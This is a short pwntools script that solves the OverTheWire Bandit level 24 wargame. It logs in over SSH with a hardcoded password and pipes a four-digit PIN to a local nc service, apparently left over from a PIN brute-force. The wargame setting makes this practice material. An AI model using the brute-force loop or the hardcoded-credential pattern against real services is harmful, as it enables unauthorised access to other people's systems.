from pwn import *

hostname = 'bandit.labs.overthewire.org'
username = 'bandit24'
password = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
cmd = 'echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ {} | nc 127.0.0.1 30002 | egrep -v  "Exiting|Wrong|I am|Correct!" | sed "s/The password of user bandit25 is //"'

s =  ssh(host=hostname, user=username, password=password)

for i in range(5669, 5670):
	ex = s.run(cmd.format(i))
	print ex.recvall()

